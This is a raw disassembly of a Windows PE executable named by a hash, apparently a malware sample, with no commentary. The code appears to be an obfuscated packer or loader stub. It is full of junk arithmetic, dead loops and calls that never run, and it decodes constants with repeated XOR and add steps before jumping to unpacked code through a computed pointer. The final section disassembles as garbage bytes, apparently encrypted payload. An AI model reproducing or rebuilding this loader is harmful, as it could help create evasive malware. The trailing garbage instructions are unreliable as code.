
aa90e8748ea95f889695d48f7848ba4b78de51eae70b7555557c9ad2bc9650c2.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x230
  401009:	add    DWORD PTR ds:0x4377a3,0x7b21
  401013:	push   esi
  401014:	or     DWORD PTR ds:0x4377b7,0x1d26
  40101e:	xor    eax,eax
  401020:	sbb    DWORD PTR ds:0x43774b,0x4377b7
  40102a:	mov    WORD PTR [ebp-0x24],ax
  40102e:	mov    DWORD PTR ds:0x437783,0x17
  401038:	cmp    DWORD PTR ds:0x437783,0x0
  40103f:	je     0x401075
  401045:	cmp    DWORD PTR ds:0x437783,0x23
  40104c:	jl     0x401075
  401052:	jmp    0x401065
  401057:	push   DWORD PTR [ebp-0x10]
  40105a:	push   0x43778f
  40105f:	call   DWORD PTR ds:0x43c960
  401065:	mov    eax,ds:0x437783
  40106a:	dec    eax
  40106b:	mov    ds:0x437783,eax
  401070:	jmp    0x401038
  401075:	mov    eax,ds:0x4375df
  40107a:	movzx  eax,BYTE PTR [eax]
  40107d:	push   eax
  40107e:	or     DWORD PTR ds:0x43774f,0x437783
  401088:	call   DWORD PTR ds:0x43ca38
  40108e:	cmp    eax,0x3
  401091:	mov    DWORD PTR ds:0x4377af,0x1a4e
  40109b:	jle    0x4010b7
  4010a1:	xor    eax,eax
  4010a3:	jmp    0x401a9e
  4010a8:	mov    DWORD PTR ds:0x4377b7,0x36bc
  4010b2:	jmp    0x4011b9
  4010b7:	push   0x0
  4010b9:	lea    eax,[ebp-0x1d0]
  4010bf:	or     DWORD PTR ds:0x4377af,0x4954
  4010c9:	push   eax
  4010ca:	sub    DWORD PTR ds:0x43770f,0x5936
  4010d4:	push   0x4374c3
  4010d9:	call   DWORD PTR ds:0x43c974
  4010df:	mov    DWORD PTR ds:0x43771f,0x19ca
  4010e9:	cmp    eax,0xffffffff
  4010ec:	mov    DWORD PTR ds:0x437773,0x6253
  4010f6:	je     0x401127
  4010fc:	and    DWORD PTR ds:0x43778f,0x437767
  401106:	xor    eax,eax
  401108:	mov    DWORD PTR ds:0x4377bb,0x7a95
  401112:	inc    eax
  401113:	mov    DWORD PTR ds:0x43778f,0x2676
  40111d:	jmp    0x401a9e
  401122:	jmp    0x4011b9
  401127:	push   0x8
  401129:	dec    DWORD PTR ds:0x43777b
  40112f:	push   0x4374eb
  401134:	push   0x87687663
  401139:	call   DWORD PTR ds:0x43c9c0
  40113f:	mov    DWORD PTR ds:0x43777f,0x66a5
  401149:	cmp    eax,0x8
  40114c:	jne    0x40117c
  401152:	mov    DWORD PTR ds:0x43774b,0x20c8
  40115c:	xor    eax,eax
  40115e:	mov    DWORD PTR ds:0x43775f,0x154c
  401168:	jmp    0x401a9e
  40116d:	mov    DWORD PTR ds:0x4377b3,0xffc
  401177:	jmp    0x4011b9
  40117c:	xor    DWORD PTR ds:0x43779b,0x43771b
  401186:	call   DWORD PTR ds:0x43c9d8
  40118c:	test   eax,eax
  40118e:	mov    DWORD PTR ds:0x43772f,0x40bc
  401198:	jne    0x4011b9
  40119e:	and    DWORD PTR ds:0x437793,0x2e57
  4011a8:	xor    eax,eax
  4011aa:	mov    DWORD PTR ds:0x4377af,0x587d
  4011b4:	jmp    0x401a9e
  4011b9:	sub    ecx,DWORD PTR ds:0x4377a7
  4011bf:	mov    DWORD PTR [ebp-0x20],0x0
  4011c6:	mov    DWORD PTR [ebp-0x148],0xf89c85b0
  4011d0:	adc    DWORD PTR ds:0x437717,edi
  4011d6:	mov    DWORD PTR [ebp-0x1dc],0xf89c85b3
  4011e0:	and    DWORD PTR ds:0x43772b,0x0
  4011ea:	jmp    0x4011fc
  4011ef:	mov    ecx,DWORD PTR ds:0x43772b
  4011f5:	inc    ecx
  4011f6:	mov    DWORD PTR ds:0x43772b,ecx
  4011fc:	cmp    DWORD PTR ds:0x43772b,0x10
  401203:	jae    0x40124a
  401209:	cmp    DWORD PTR ds:0x43772b,0xb
  401210:	ja     0x40124a
  401216:	jmp    0x40122b
  40121b:	push   0x43701b
  401220:	push   0x43707c
  401225:	call   DWORD PTR ds:0x43c964
  40122b:	cmp    DWORD PTR ds:0x43772b,0xa
  401232:	jne    0x401245
  401238:	mov    ecx,DWORD PTR ds:0x43772b
  40123e:	inc    ecx
  40123f:	mov    DWORD PTR ds:0x43772b,ecx
  401245:	jmp    0x4011ef
  40124a:	lea    eax,[ebp-0x1d8]
  401250:	mov    DWORD PTR [ebp-0x13c],eax
  401256:	lea    eax,[ebp-0x4]
  401259:	mov    ecx,DWORD PTR ds:0x43774f
  40125f:	and    DWORD PTR ds:0x437737,ecx
  401265:	mov    DWORD PTR [ebp-0x140],eax
  40126b:	mov    eax,ds:0x43739f
  401270:	mov    eax,DWORD PTR [eax+0x1c8]
  401276:	mov    eax,DWORD PTR [eax]
  401278:	mov    DWORD PTR ds:0x437737,0x16
  401282:	cmp    DWORD PTR ds:0x437737,0x0
  401289:	je     0x4012be
  40128f:	cmp    DWORD PTR ds:0x437737,0x1c
  401296:	jbe    0x4012be
  40129c:	jmp    0x4012ac
  4012a1:	push   0x437042
  4012a6:	call   DWORD PTR ds:0x43c968
  4012ac:	mov    ecx,DWORD PTR ds:0x437737
  4012b2:	dec    ecx
  4012b3:	mov    DWORD PTR ds:0x437737,ecx
  4012b9:	jmp    0x401282
  4012be:	xor    eax,0x75108b5
  4012c3:	add    eax,0x3272fb
  4012c8:	mov    DWORD PTR ds:0x43779b,0x40d
  4012d2:	mov    ecx,DWORD PTR [ebp-0x140]
  4012d8:	mov    DWORD PTR [ecx],eax
  4012da:	mov    DWORD PTR ds:0x43778f,0x630f
  4012e4:	lea    eax,[ebp-0x10]
  4012e7:	mov    DWORD PTR [ebp-0x12c],eax
  4012ed:	cmp    DWORD PTR ds:0x4375d3,0x456dfdfb
  4012f7:	mov    DWORD PTR ds:0x43776f,0x19c2
  401301:	jne    0x401496
  401307:	and    DWORD PTR ds:0x43771b,0x0
  401311:	jmp    0x401324
  401316:	xor    eax,eax
  401318:	xor    eax,DWORD PTR ds:0x43771b
  40131e:	inc    eax
  40131f:	mov    ds:0x43771b,eax
  401324:	cmp    DWORD PTR ds:0x43771b,0x15
  40132b:	jae    0x40137e
  401331:	cmp    DWORD PTR ds:0x43771b,0x8
  401338:	jbe    0x40137e
  40133e:	jmp    0x401361
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   0x437727
  40134b:	push   0x4762
  401350:	push   0x437104
  401355:	push   DWORD PTR [ebp-0x18]
  401358:	push   DWORD PTR [ebp-0x14]
  40135b:	call   DWORD PTR ds:0x43c96c
  401361:	cmp    DWORD PTR ds:0x43771b,0x7
  401368:	jne    0x401379
  40136e:	mov    eax,ds:0x43771b
  401373:	inc    eax
  401374:	mov    ds:0x43771b,eax
  401379:	jmp    0x401316
  40137e:	mov    eax,DWORD PTR [ebp-0x148]
  401384:	dec    ecx
  401385:	xor    eax,0x75108b5
  40138a:	add    eax,0x3272fb
  40138f:	mov    ecx,DWORD PTR ds:0x43739f
  401395:	mov    ecx,DWORD PTR [ecx+0x198]
  40139b:	sbb    DWORD PTR ds:0x43772f,0x437773
  4013a5:	mov    DWORD PTR [ecx],eax
  4013a7:	or     ecx,DWORD PTR ds:0x43775f
  4013ad:	mov    eax,DWORD PTR [ebp-0x148]
  4013b3:	mov    DWORD PTR ds:0x437753,0x15
  4013bd:	cmp    DWORD PTR ds:0x437753,0x0
  4013c4:	je     0x401418
  4013ca:	cmp    DWORD PTR ds:0x437753,0x9
  4013d1:	jg     0x401418
  4013d7:	jmp    0x4013ea
  4013dc:	push   0x43775b
  4013e1:	push   DWORD PTR [ebp-0xc]
  4013e4:	call   DWORD PTR ds:0x43c970
  4013ea:	cmp    DWORD PTR ds:0x437753,0xa
  4013f1:	jne    0x401404
  4013f7:	mov    ecx,DWORD PTR ds:0x437753
  4013fd:	dec    ecx
  4013fe:	mov    DWORD PTR ds:0x437753,ecx
  401404:	xor    ecx,ecx
  401406:	xor    ecx,DWORD PTR ds:0x437753
  40140c:	dec    ecx
  40140d:	mov    DWORD PTR ds:0x437753,ecx
  401413:	jmp    0x4013bd
  401418:	xor    eax,0x75108b5
  40141d:	and    DWORD PTR ds:0x43777b,0x0
  401427:	mov    ecx,DWORD PTR ds:0x43777b
  40142d:	inc    ecx
  40142e:	mov    DWORD PTR ds:0x43777b,ecx
  401434:	cmp    DWORD PTR ds:0x43777b,0x15
  40143b:	jl     0x401471
  401441:	jmp    0x401464
  401446:	push   DWORD PTR [ebp-0x14]
  401449:	push   0x43773f
  40144e:	push   DWORD PTR [ebp-0x1c]
  401451:	push   0x43706e
  401456:	push   0x8166
  40145b:	push   DWORD PTR [ebp-0x10]
  40145e:	call   DWORD PTR ds:0x43c978
  401464:	cmp    DWORD PTR ds:0x43777b,0x12
  40146b:	jb     0x401427
  401471:	add    eax,0x3272fb
  401476:	mov    ds:0x4375d3,eax
  40147b:	mov    eax,DWORD PTR [ebp-0x148]
  401481:	or     DWORD PTR ds:0x4377b3,edx
  401487:	xor    eax,0x75108b5
  40148c:	add    eax,0x3272fb
  401491:	mov    ds:0x437497,eax
  401496:	xor    DWORD PTR ds:0x43772b,ebx
  40149c:	mov    eax,ds:0x43739f
  4014a1:	mov    eax,DWORD PTR [eax+0x18c]
  4014a7:	mov    ecx,DWORD PTR [ebp-0x12c]
  4014ad:	neg    DWORD PTR ds:0x4377b7
  4014b3:	mov    eax,DWORD PTR [eax]
  4014b5:	sbb    DWORD PTR ds:0x437713,0x4377b3
  4014bf:	mov    DWORD PTR [ecx],eax
  4014c1:	mov    DWORD PTR [ebp-0x128],0xf89c85bc
  4014cb:	mov    DWORD PTR ds:0x437797,0x10
  4014d5:	cmp    DWORD PTR ds:0x437797,0x0
  4014dc:	je     0x40152b
  4014e2:	cmp    DWORD PTR ds:0x437797,0x20
  4014e9:	jg     0x40152b
  4014ef:	jmp    0x401518
  4014f4:	push   0x4370c1
  4014f9:	push   0x6f44
  4014fe:	push   0x27cf
  401503:	push   0x84b9
  401508:	push   0x17d9
  40150d:	push   0x366e
  401512:	call   DWORD PTR ds:0x43c97c
  401518:	xor    eax,eax
  40151a:	add    eax,DWORD PTR ds:0x437797
  401520:	dec    eax
  401521:	mov    ds:0x437797,eax
  401526:	jmp    0x4014d5
  40152b:	mov    DWORD PTR [ebp-0xc],0xf89c85bc
  401532:	movzx  eax,WORD PTR ds:0x437763
  401539:	sub    DWORD PTR ds:0x437773,eax
  40153f:	mov    DWORD PTR [ebp-0x8],0xf89c85bc
  401546:	mov    eax,ds:0x43778b
  40154b:	adc    DWORD PTR ds:0x43776b,eax
  401551:	mov    eax,ds:0x437463
  401556:	mov    eax,DWORD PTR [eax]
  401558:	mov    DWORD PTR [ebp-0x124],eax
  40155e:	mov    DWORD PTR [ebp-0x130],0xf89c85b0
  401568:	sbb    DWORD PTR ds:0x43773f,0x437793
  401572:	mov    DWORD PTR [ebp-0x138],0xf89c85bc
  40157c:	sub    eax,DWORD PTR ds:0x437743
  401582:	mov    DWORD PTR [ebp-0x1e4],0xf89c85b8
  40158c:	mov    eax,DWORD PTR [ebp-0x148]
  401592:	xor    eax,0x75108b5
  401597:	add    eax,0x3272fb
  40159c:	mov    DWORD PTR ds:0x4377af,0x1731
  4015a6:	mov    DWORD PTR [ebp-0x1e8],eax
  4015ac:	jmp    0x4015e1
  4015b1:	sub    DWORD PTR ds:0x4377b3,ecx
  4015b7:	mov    eax,DWORD PTR [ebp-0x1dc]
  4015bd:	neg    DWORD PTR ds:0x437723
  4015c3:	xor    eax,0x75108b5
  4015c8:	or     DWORD PTR ds:0x437733,ecx
  4015ce:	mov    ecx,DWORD PTR [ebp-0x1e8]
  4015d4:	lea    eax,[ecx+eax*1+0x3272fb]
  4015db:	mov    DWORD PTR [ebp-0x1e8],eax
  4015e1:	mov    eax,DWORD PTR [ebp-0x1dc]
  4015e7:	and    DWORD PTR ds:0x437753,0x0
  4015f1:	mov    ecx,DWORD PTR ds:0x437753
  4015f7:	inc    ecx
  4015f8:	mov    DWORD PTR ds:0x437753,ecx
  4015fe:	cmp    DWORD PTR ds:0x437753,0x4
  401605:	jbe    0x40164e
  40160b:	jmp    0x401625
  401610:	push   0x437089
  401615:	push   0x437000
  40161a:	push   0x400000
  40161f:	call   DWORD PTR ds:0x43c980
  401625:	cmp    DWORD PTR ds:0x437753,0x3
  40162c:	jne    0x401641
  401632:	xor    ecx,ecx
  401634:	xor    ecx,DWORD PTR ds:0x437753
  40163a:	inc    ecx
  40163b:	mov    DWORD PTR ds:0x437753,ecx
  401641:	cmp    DWORD PTR ds:0x437753,0x10
  401648:	jb     0x4015f1
  40164e:	xor    eax,0x75108b5
  401653:	mov    ecx,DWORD PTR [ebp-0x1dc]
  401659:	neg    DWORD PTR ds:0x43777f
  40165f:	xor    ecx,0x75108b5
  401665:	or     DWORD PTR ds:0x43774b,0x7a77
  40166f:	lea    eax,[eax+ecx*1+0x64e5f6]
  401676:	mov    DWORD PTR ds:0x43779f,0x1f
  401680:	cmp    DWORD PTR ds:0x43779f,0x0
  401687:	je     0x4016c6
  40168d:	cmp    DWORD PTR ds:0x43779f,0x26
  401694:	jbe    0x4016c6
  40169a:	jmp    0x4016b4
  40169f:	push   DWORD PTR [ebp-0x28]
  4016a2:	push   DWORD PTR [ebp-0x28]
  4016a5:	push   DWORD PTR [ebp-0xc]
  4016a8:	push   DWORD PTR [ebp-0x18]
  4016ab:	push   DWORD PTR [ebp-0x18]
  4016ae:	call   DWORD PTR ds:0x43c984
  4016b4:	mov    ecx,DWORD PTR ds:0x43779f
  4016ba:	dec    ecx
  4016bb:	mov    DWORD PTR ds:0x43779f,ecx
  4016c1:	jmp    0x401680
  4016c6:	mov    ecx,DWORD PTR [ebp-0x1dc]
  4016cc:	xor    ecx,0x75108b5
  4016d2:	lea    eax,[eax+ecx*1+0x3272fb]
  4016d9:	cmp    DWORD PTR [ebp-0x1e8],eax
  4016df:	ja     0x401726
  4016e5:	mov    eax,DWORD PTR [ebp-0x1dc]
  4016eb:	xor    eax,0x75108b5
  4016f0:	mov    ecx,DWORD PTR [ebp-0x1e8]
  4016f6:	lea    eax,[ecx+eax*1+0x3272fb]
  4016fd:	push   eax
  4016fe:	mov    eax,DWORD PTR [ebp-0x130]
  401704:	xor    eax,0x75108b5
  401709:	lea    eax,[ebp+eax*1+0x327303]
  401710:	push   eax
  401711:	mov    eax,ds:0x43739f
  401716:	push   DWORD PTR [eax+0x1bc]
  40171c:	call   0x401ab4
  401721:	jmp    0x4015b1
  401726:	mov    eax,DWORD PTR [ebp+0xc]
  401729:	mov    ds:0x437223,eax
  40172e:	mov    eax,DWORD PTR [ebp+0x10]
  401731:	mov    ds:0x43747f,eax
  401736:	mov    eax,ds:0x437223
  40173b:	sub    eax,0x3272fb
  401740:	xor    eax,0x75108b5
  401745:	mov    ecx,DWORD PTR [ebp-0x13c]
  40174b:	mov    DWORD PTR [ecx],eax
  40174d:	lea    eax,[ebp-0x144]
  401753:	mov    DWORD PTR [ebp-0x1e0],eax
  401759:	lea    eax,[ebp-0x1e0]
  40175f:	mov    DWORD PTR [ebp-0x134],eax
  401765:	lea    eax,[ebp+0x4]
  401768:	mov    ecx,DWORD PTR [ebp-0x1e0]
  40176e:	mov    DWORD PTR [ecx],eax
  401770:	mov    eax,DWORD PTR [ebp-0x1d8]
  401776:	xor    eax,0x75108b5
  40177b:	add    eax,0x3272fb
  401780:	xor    ecx,ecx
  401782:	sub    eax,0x5424137
  401787:	sbb    ecx,0x0
  40178a:	xor    eax,0x8a29a14b
  40178f:	xor    ecx,0x0
  401792:	mov    DWORD PTR [ebp-0x210],eax
  401798:	mov    DWORD PTR [ebp-0x20c],ecx
  40179e:	cmp    DWORD PTR [ebp-0x210],0x70941f81
  4017a8:	jne    0x4017bb
  4017ae:	cmp    DWORD PTR [ebp-0x20c],0xffffffff
  4017b5:	je     0x401831
  4017bb:	mov    eax,DWORD PTR [ebp-0x148]
  4017c1:	xor    eax,0x75108b5
  4017c6:	add    eax,0x3272fb
  4017cb:	mov    ecx,eax
  4017cd:	xor    esi,esi
  4017cf:	sub    ecx,0x5424137
  4017d5:	sbb    esi,0x0
  4017d8:	xor    ecx,0x8a29a14b
  4017de:	xor    esi,0x0
  4017e1:	mov    eax,DWORD PTR [ebp-0x4]
  4017e4:	cdq    
  4017e5:	sub    eax,0x5424137
  4017ea:	sbb    edx,0x0
  4017ed:	xor    eax,0x8a29a14b
  4017f2:	xor    edx,0x0
  4017f5:	mov    DWORD PTR [ebp-0x218],ecx
  4017fb:	mov    DWORD PTR [ebp-0x214],esi
  401801:	mov    DWORD PTR [ebp-0x220],eax
  401807:	mov    DWORD PTR [ebp-0x21c],edx
  40180d:	mov    eax,DWORD PTR [ebp-0x218]
  401813:	cmp    eax,DWORD PTR [ebp-0x220]
  401819:	jne    0x4019dc
  40181f:	mov    eax,DWORD PTR [ebp-0x214]
  401825:	cmp    eax,DWORD PTR [ebp-0x21c]
  40182b:	jne    0x4019dc
  401831:	mov    eax,DWORD PTR [ebp-0x148]
  401837:	xor    eax,0x75108b5
  40183c:	add    eax,0x3272fb
  401841:	xor    ecx,ecx
  401843:	sub    eax,0x5424137
  401848:	sbb    ecx,0x0
  40184b:	xor    eax,0x8a29a14b
  401850:	xor    ecx,0x0
  401853:	mov    edx,DWORD PTR [ebp-0x10]
  401856:	xor    esi,esi
  401858:	sub    edx,0x5424137
  40185e:	sbb    esi,0x0
  401861:	xor    edx,0x8a29a14b
  401867:	xor    esi,0x0
  40186a:	mov    DWORD PTR [ebp-0x228],eax
  401870:	mov    DWORD PTR [ebp-0x224],ecx
  401876:	mov    DWORD PTR [ebp-0x230],edx
  40187c:	mov    DWORD PTR [ebp-0x22c],esi
  401882:	mov    eax,DWORD PTR [ebp-0x228]
  401888:	cmp    eax,DWORD PTR [ebp-0x230]
  40188e:	jne    0x401936
  401894:	mov    eax,DWORD PTR [ebp-0x224]
  40189a:	cmp    eax,DWORD PTR [ebp-0x22c]
  4018a0:	jne    0x401936
  4018a6:	mov    eax,DWORD PTR [ebp-0x148]
  4018ac:	xor    eax,0x75108b5
  4018b1:	add    eax,0x3272fb
  4018b6:	mov    ecx,DWORD PTR ds:0x43739f
  4018bc:	mov    ecx,DWORD PTR [ecx+0x198]
  4018c2:	cmp    eax,DWORD PTR [ecx]
  4018c4:	jne    0x4018f1
  4018ca:	mov    eax,DWORD PTR [ebp-0x148]
  4018d0:	xor    eax,0x75108b5
  4018d5:	add    eax,0x3272fb
  4018da:	push   eax
  4018db:	push   0xf89c85bc
  4018e0:	push   DWORD PTR [ebp-0x1dc]
  4018e6:	push   DWORD PTR [ebp-0x148]
  4018ec:	call   0x414de4
  4018f1:	push   0xf89c85f0
  4018f6:	push   0xf89c87b0
  4018fb:	push   DWORD PTR [ebp-0x1dc]
  401901:	push   DWORD PTR [ebp-0x148]
  401907:	call   0x4155f6
  40190c:	mov    eax,DWORD PTR [ebp-0x148]
  401912:	xor    eax,0x75108b5
  401917:	add    eax,0x3272fb
  40191c:	mov    ds:0x43742b,eax
  401921:	mov    eax,DWORD PTR [ebp-0x148]
  401927:	xor    eax,0x75108b5
  40192c:	add    eax,0x3272fb
  401931:	mov    ds:0x437423,eax
  401936:	mov    eax,DWORD PTR [ebp-0x1e0]
  40193c:	mov    eax,DWORD PTR [eax]
  40193e:	mov    ecx,DWORD PTR [ebp-0x148]
  401944:	xor    ecx,0x75108b5
  40194a:	add    ecx,0x3272fb
  401950:	cmp    eax,ecx
  401952:	je     0x4019d7
  401958:	mov    DWORD PTR [ebp-0x1ec],0xf152c3b
  401962:	mov    DWORD PTR [ebp-0x1f8],0x712edce
  40196c:	mov    DWORD PTR [ebp-0x1f4],0x373fc28
  401976:	mov    DWORD PTR [ebp-0x1f0],0x72670ad8
  401980:	lea    eax,[ebp-0x1f0]
  401986:	push   eax
  401987:	lea    eax,[ebp-0x1f4]
  40198d:	push   eax
  40198e:	lea    eax,[ebp-0x1f8]
  401994:	push   eax
  401995:	lea    eax,[ebp-0x1ec]
  40199b:	push   eax
  40199c:	call   0x42d44a
  4019a1:	push   DWORD PTR [ebp-0x134]
  4019a7:	push   DWORD PTR [ebp-0x1d4]
  4019ad:	push   DWORD PTR [ebp-0x1dc]
  4019b3:	push   DWORD PTR [ebp-0x148]
  4019b9:	call   0x40408a
  4019be:	push   0x4
  4019c0:	mov    eax,ds:0x43739f
  4019c5:	add    eax,0x1cc
  4019ca:	push   eax
  4019cb:	lea    eax,[ebp-0x1d4]
  4019d1:	push   eax
  4019d2:	call   0x401ab4
  4019d7:	jmp    0x401a96
  4019dc:	lea    eax,[ebp-0x1fc]
  4019e2:	mov    DWORD PTR [ebp-0x208],eax
  4019e8:	lea    eax,[ebp-0x200]
  4019ee:	mov    DWORD PTR [ebp-0x204],eax
  4019f4:	mov    eax,DWORD PTR [ebp-0x204]
  4019fa:	mov    ecx,DWORD PTR ds:0x43739f
  401a00:	mov    DWORD PTR [eax],ecx
  401a02:	push   0x4
  401a04:	mov    eax,DWORD PTR [ebp-0x200]
  401a0a:	push   DWORD PTR [eax+0x194]
  401a10:	push   DWORD PTR [ebp-0x208]
  401a16:	call   0x401ab4
  401a1b:	mov    eax,DWORD PTR [ebp-0x208]
  401a21:	mov    eax,DWORD PTR [eax]
  401a23:	mov    ecx,DWORD PTR [ebp-0x200]
  401a29:	mov    ecx,DWORD PTR [ecx+0x194]
  401a2f:	mov    edx,DWORD PTR [ebp-0x200]
  401a35:	mov    edx,DWORD PTR [edx+0x194]
  401a3b:	mov    edx,DWORD PTR [edx]
  401a3d:	mov    ecx,DWORD PTR [ecx]
  401a3f:	mov    edx,DWORD PTR [edx+0x3c]
  401a42:	add    eax,DWORD PTR [ecx+edx*1+0x28]
  401a46:	mov    ecx,DWORD PTR [ebp-0x208]
  401a4c:	mov    DWORD PTR [ecx],eax
  401a4e:	push   DWORD PTR ds:0x43747f
  401a54:	push   DWORD PTR ds:0x437223
  401a5a:	mov    eax,ds:0x43739f
  401a5f:	mov    eax,DWORD PTR [eax+0x194]
  401a65:	push   DWORD PTR [eax]
  401a67:	mov    eax,DWORD PTR [ebp-0x1fc]
  401a6d:	call   eax
  401a6f:	mov    ecx,DWORD PTR ds:0x43739f
  401a75:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401a7b:	mov    DWORD PTR [ecx],eax
  401a7d:	push   0x4
  401a7f:	mov    eax,ds:0x43739f
  401a84:	add    eax,0x1cc
  401a89:	push   eax
  401a8a:	lea    eax,[ebp-0x1d4]
  401a90:	push   eax
  401a91:	call   0x401ab4
  401a96:	mov    eax,DWORD PTR [ebp-0x1d4]
  401a9c:	mov    eax,DWORD PTR [eax]
  401a9e:	pop    esi
  401a9f:	leave  
  401aa0:	ret    0xc
  401aa3:	push   ebp
  401aa4:	mov    ebp,esp
  401aa6:	xor    eax,eax
  401aa8:	and    DWORD PTR ds:0x437743,0x43770f
  401ab2:	pop    ebp
  401ab3:	ret    
  401ab4:	push   ebp
  401ab5:	mov    ebp,esp
  401ab7:	sub    esp,0x2c
  401aba:	and    DWORD PTR ds:0x437777,0x0
  401ac4:	jmp    0x401ad8
  401ac9:	xor    edx,edx
  401acb:	add    edx,DWORD PTR ds:0x437777
  401ad1:	inc    edx
  401ad2:	mov    DWORD PTR ds:0x437777,edx
  401ad8:	cmp    DWORD PTR ds:0x437777,0x18
  401adf:	jae    0x401b21
  401ae5:	cmp    DWORD PTR ds:0x437777,0x6
  401aec:	jg     0x401b21
  401af2:	jmp    0x401b00
  401af7:	push   DWORD PTR [ebp-0x28]
  401afa:	call   DWORD PTR ds:0x43c988
  401b00:	cmp    DWORD PTR ds:0x437777,0x5
  401b07:	jne    0x401b1c
  401b0d:	xor    edx,edx
  401b0f:	add    edx,DWORD PTR ds:0x437777
  401b15:	inc    edx
  401b16:	mov    DWORD PTR ds:0x437777,edx
  401b1c:	jmp    0x401ac9
  401b21:	push   esi
  401b22:	or     DWORD PTR ds:0x43770f,0x7b2e
  401b2c:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  401b33:	and    DWORD PTR ds:0x43779b,0x0
  401b3d:	jmp    0x401b4d
  401b42:	mov    eax,ds:0x43779b
  401b47:	inc    eax
  401b48:	mov    ds:0x43779b,eax
  401b4d:	cmp    DWORD PTR ds:0x43779b,0x18
  401b54:	jae    0x401b97
  401b5a:	cmp    DWORD PTR ds:0x43779b,0xa
  401b61:	jbe    0x401b97
  401b67:	jmp    0x401b7a
  401b6c:	push   0x4590
  401b71:	push   DWORD PTR [ebp-0x10]
  401b74:	call   DWORD PTR ds:0x43c98c
  401b7a:	cmp    DWORD PTR ds:0x43779b,0x9
  401b81:	jne    0x401b92
  401b87:	mov    eax,ds:0x43779b
  401b8c:	inc    eax
  401b8d:	mov    ds:0x43779b,eax
  401b92:	jmp    0x401b42
  401b97:	mov    DWORD PTR [ebp-0x8],0xf89c85b3
  401b9e:	mov    eax,DWORD PTR [ebp-0x4]
  401ba1:	add    edx,0x774
  401ba7:	xor    eax,0x75108b5
  401bac:	add    eax,0x3272fb
  401bb1:	add    DWORD PTR ds:0x437753,0x3afa
  401bbb:	xor    ecx,ecx
  401bbd:	and    edx,DWORD PTR ds:0x437767
  401bc3:	mov    edx,DWORD PTR [ebp+0x10]
  401bc6:	xor    esi,esi
  401bc8:	sub    edx,0x5424137
  401bce:	mov    DWORD PTR ds:0x43779f,0x3ed0
  401bd8:	sbb    esi,0x0
  401bdb:	sub    DWORD PTR ds:0x437747,0x437777
  401be5:	xor    edx,0x8a29a14b
  401beb:	xor    esi,0x0
  401bee:	xor    edx,0x8a29a14b
  401bf4:	xor    esi,0x0
  401bf7:	adc    DWORD PTR ds:0x43775f,0x43772f
  401c01:	add    edx,0x5424137
  401c07:	adc    esi,0x0
  401c0a:	mov    DWORD PTR [ebp-0x14],eax
  401c0d:	mov    DWORD PTR ds:0x43772f,0x4892
  401c17:	mov    DWORD PTR [ebp-0x10],ecx
  401c1a:	mov    DWORD PTR [ebp-0x1c],edx
  401c1d:	movzx  eax,BYTE PTR ds:0x43770f
  401c24:	mov    DWORD PTR [ebp-0x18],esi
  401c27:	mov    eax,DWORD PTR [ebp-0x14]
  401c2a:	cmp    eax,DWORD PTR [ebp-0x1c]
  401c2d:	mov    DWORD PTR ds:0x437747,0x1bf2
  401c37:	jne    0x401c53
  401c3d:	mov    eax,DWORD PTR [ebp-0x10]
  401c40:	mov    DWORD PTR ds:0x43777f,0x6546
  401c4a:	cmp    eax,DWORD PTR [ebp-0x18]
  401c4d:	je     0x404080
  401c53:	mov    eax,DWORD PTR [ebp+0xc]
  401c56:	mov    DWORD PTR ds:0x43774b,0x1906
  401c60:	cmp    eax,DWORD PTR [ebp+0x8]
  401c63:	mov    DWORD PTR ds:0x4377b7,0x6132
  401c6d:	je     0x404080
  401c73:	mov    eax,DWORD PTR [ebp-0x4]
  401c76:	xor    eax,0x75108b5
  401c7b:	add    eax,0x3272fb
  401c80:	jmp    0x403fce
  401c85:	int3   
  401c86:	xor    al,0xbc
  401c88:	push   ss
  401c89:	fs jbe 0x401ce0
  401c8c:	je     0x401c61
  401c8e:	or     DWORD PTR [edx+0x4f],0x5e
  401c92:	ret    
  401c93:	sti    
  401c94:	fwait
  401c95:	jnp    0x401d12
  401c97:	jnp    0x401d14
  401c99:	stos   BYTE PTR es:[edi],al
  401c9a:	cwde   
  401c9b:	jnp    0x401d18
  401c9d:	rol    ebx,cl
  401c9f:	mov    esi,0xe4d7cdd6
  401ca4:	(bad)  
  401ca5:	fcmovnb st,st(4)
  401ca7:	cmc    
  401ca8:	(bad)  
  401ca9:	fucomi st,st(6)
  401cab:	ror    edx,cl
  401cad:	(bad)  
  401caf:	ror    esp,cl
  401cb1:	int    0xcc
  401cb3:	sar    esi,cl
  401cb5:	inc    BYTE PTR [edx]
  401cb7:	retf   
  401cb8:	or     ch,dl
  401cba:	(bad)  
  401cbc:	enter  0xb8b3,0xd1
  401cc0:	mov    al,0xb0
  401cc2:	not    eax
  401cc4:	lods   al,BYTE PTR ds:[esi]
  401cc5:	out    dx,al
  401cc6:	ror    bl,0xf9
  401cc9:	aam    0xd6
  401ccb:	ret    
  401ccc:	ret    
  401ccd:	mov    ebp,0xdbe2e703
  401cd2:	idiv   ebp
  401cd4:	or     eax,esp
  401cd6:	leave  
  401cd7:	aam    0xc5
  401cd9:	or     ecx,esp
  401cdb:	add    DWORD PTR ds:0xb2c0d1c9,ecx
  401ce1:	in     al,0xe8
  401ce3:	icebp  
  401ce4:	sar    DWORD PTR [ebx-0x3244073c],0xb8
  401ceb:	jmp    0x401cdd
  401ced:	out    dx,al
  401cee:	aam    0xb8
  401cf0:	ret    
  401cf1:	neg    dh
  401cf3:	(bad)  
  401cf4:	fcomip st,st(7)
  401cf6:	xlat   BYTE PTR ds:[ebx]
  401cf7:	add    bl,ah
  401cf9:	enter  0xe604,0x11
  401cfd:	mov    edi,0xe4e1dcc7
  401d02:	call   0xd51317e7
  401d07:	mov    ah,0xeb
  401d09:	(bad)  
  401d0b:	idiv   BYTE PTR [edi+esi*4-0x21380c18]
  401d12:	push   es
  401d13:	add    al,0xe3
  401d15:	pop    es
  401d16:	jmp    0xfad8:0x13da08f4
  401d1d:	les    esi,FWORD PTR [ebx-0x281e230f]
  401d23:	lock mov ch,0xb9
  401d26:	mov    edx,0xbcf2acb5
  401d2b:	xlat   BYTE PTR ds:[ebx]
  401d2c:	jecxz  0x401cec
  401d2e:	(bad)  
  401d2f:	in     al,dx
  401d30:	in     al,dx
  401d31:	jecxz  0x401d34
  401d33:	icebp  
  401d34:	stc    
